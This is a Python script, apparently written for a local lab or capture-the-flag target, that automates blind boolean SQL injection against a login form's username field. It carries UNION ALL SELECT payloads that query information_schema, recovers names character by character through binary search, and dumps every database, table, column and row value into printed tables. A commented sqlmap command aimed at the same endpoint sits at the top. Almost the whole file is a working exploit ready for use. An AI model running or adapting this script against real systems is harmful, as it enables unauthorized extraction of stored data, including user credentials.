#!/usr/bin/python3.7

# sqlmap -u "http://127.0.0.1:5000/auth/login?username=*&password=1" --method=post --dbms=mysql --level 5 --risk 3 --hpp --dbs --time-sec 25

import requests as r
import string
from beautifultable import BeautifulTable as BT
from dataclasses import dataclass

url = 'http://127.0.0.1:1234/auth/login'

@dataclass
class SQL:
    sql1: str
    sql2: str

sql1 = SQL(
    "\' UNION ALL SELECT schema_name FROM information_schema.schemata " \
    "WHERE ASCII(SUBSTR(schema_name,1,1)) {} {} LIMIT 1 OFFSET {}; -- ",

    "\' UNION ALL SELECT schema_name FROM information_schema.schemata " \
    "WHERE ASCII(SUBSTR(schema_name,{},1)) {} {} "\
    "AND substr(schema_name, 1, {}) = '{}' LIMIT 1 OFFSET {}; -- "
)

sql2 = SQL(
    "\' UNION ALL SELECT table_name FROM information_schema.tables "\
    "WHERE ASCII(SUBSTR(table_name,1,1)) {} {} "\
    "AND table_schema = '%s' LIMIT 1 OFFSET {}; -- ",

    "\' UNION ALL SELECT table_name FROM information_schema.tables "\
    "WHERE ASCII(SUBSTR(table_name,{},1)) {} {} "\
    "AND SUBSTR(table_name,1,{}) = '{}' "\
    "AND table_schema = '%s' LIMIT 1 OFFSET {}; -- "
)


sql3 = SQL(
    "\' UNION ALL SELECT column_name FROM information_schema.columns "\
    "WHERE ASCII(SUBSTR(column_name,1,1)) {} {} " \
    "AND table_schema = '%s' "\
    "AND table_name = '%s' LIMIT 1 OFFSET {}; -- ",

    "\' UNION ALL SELECT column_name FROM information_schema.columns "\
    "WHERE ASCII(SUBSTR(column_name,{},1)) {} {} "\
    "AND SUBSTR(column_name,1,{}) = '{}' "\
    "AND table_schema = '%s' "\
    "AND table_name = '%s' LIMIT 1 OFFSET {}; -- "
)

sql4 = SQL(
    "' UNION ALL SELECT %s FROM %s.%s "\
    "WHERE ASCII(SUBSTR(%s,1,1)) {} {} LIMIT 1 OFFSET {}; -- ",

    "' UNION ALL SELECT %s FROM %s.%s "\
    "WHERE ASCII(SUBSTR(%s,{},1)) {} {} "\
    "AND SUBSTR(%s,1,{}) = '{}' LIMIT 1 OFFSET {}; -- "
)


chars = list(string.ascii_lowercase)
chars.extend(list(string.ascii_uppercase))
chars.extend(list(string.digits))
chars.extend(list(string.punctuation)) #['-', '_', '{', '}', '?'])

chars = list(sorted(
    chars,
    key=lambda x: ord(x)
))

def post(sql):
    return r.post(
        url, data={'username': sql, 'password':'blah'}
    ).status_code == 200


def get_first_chars(sql):
    first_chars = []
    for char in chars:
        s = sql.format('=', hex(ord(char)), '0')
        #print(s)
        if post(s):
            first_chars.append(char)
    return first_chars


def brute(sql1, sql2):
    stored_values = list()
    offset = 0

    first_chars = get_first_chars(sql1)

    for first_char in first_chars:
        getting_values = True
        offset = 0
        while getting_values: # loop until you get all values starting with first_char
            value = first_char
            getting_letters = True
            while getting_letters: # loop until you get a full value
                left = 0
                right = len(chars) - 1
                while right > left:
                    mid = left + ((right - left) // 2)
                    #3eprint(right, left, right-left)
                    s1 = sql2.format(
                        len(value) + 1, '=', hex(ord(chars[mid])),
                        len(value), value, offset,
                    )
                    s2 = sql2.format(
                        len(value) + 1, '<', hex(ord(chars[mid])),
                        len(value), value, offset,
                    )
                    #print(s2)

                    if post(s1): # letter found
                        value += chars[mid]
                        #print(len(stored_values), value, end='\r', flush=True)
                        break

                    if right - left <= 2:
                        if len(value) > 1:
                            stored_values.append(value)
                        getting_letters = False
                        break

                    if post(s2): #
                        right = mid
                    else: #
                        left = mid
            if not getting_letters:
                getting_values = False
                #print()
                break
            offset += 1
    #print(stored_values)
    return stored_values


if __name__ == "__main__":
    databases = brute(sql1.sql1, sql1.sql2)
    for i in range(len(databases)):
        print("{}: {}".format(str(i), str(databases[i])))
    database_name = databases[int(input('-> '))]

    tables = brute(
        sql2.sql1 % (database_name),
        sql2.sql2 % (database_name)
    )
    #print(tables)
    print()
    for table_name in tables:
        columns = brute(
            sql3.sql1 % (database_name, table_name),
            sql3.sql2 % (database_name, table_name)
        )
        t = []
        for column_name in columns:
            t.append(brute(sql4.sql1 % (
                column_name, database_name, table_name, column_name
            ), sql4.sql2 % (
                column_name, database_name, table_name, column_name, column_name
            )))
        if 'id' in columns:
            t[0] = [str(i) for i in range(len(t[1]))]
        table = BT()
        table.column_headers = columns
        for row in zip(*t):
            table.append_row(row)
        print(table_name)
        print(table)

